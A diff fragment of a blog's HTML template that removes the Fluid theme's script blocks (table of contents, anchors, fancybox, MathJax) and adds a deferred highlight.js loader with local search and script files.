-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  
-      <script>
-        if (!window.MathJax) {
-          window.MathJax = {
-            tex    : {
-              inlineMath: { '[+]': [['$', '$']] }
-            },
-            loader : {
-              load: ['ui/lazy']
-            },
-            options: {
-              renderActions: {
-                insertedScript: [200, () => {
-                  document.querySelectorAll('mjx-container').forEach(node => {
-                    let target = node.parentNode;
-                    if (target.nodeName.toLowerCase() === 'li') {
-                      target.parentNode.classList.add('has-jax');
-                    }
-                  });
-                }, '', false]
-              }
+        <script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+        <script>
+            // 延迟加载highlight.js以提高性能
+            function loadHighlight() {
+                if (typeof hljs !== 'undefined') {
+                    hljs.highlightAll();
+                } else {
+                    // 如果hljs还未加载，等待一段时间后重试
+                    setTimeout(loadHighlight, 100);
+                }
             }
-          };
-        } else {
-          MathJax.startup.document.state(0);
-          MathJax.texReset();
-          MathJax.typeset();
-          MathJax.typesetPromise();
-        }
-
-        Fluid.events.registerRefreshCallback(function() {
-          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
-            MathJax.startup.document.state(0);
-            MathJax.texReset();
-            MathJax.typeset();
-            MathJax.typesetPromise();
-          }
-        });
-      </script>
+            
+            document.addEventListener('DOMContentLoaded', loadHighlight);
+            
+            // 如果DOM已经加载完成，立即执行
+            if (document.readyState !== 'loading') {
+                loadHighlight();
+            }
+        </script>
     
-
-  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
+    
+    <!-- JavaScript -->
+    <script defer src="/js/search.js"></script>
+    <script defer src="/js/script.js"></script>
 </body>
 </html>
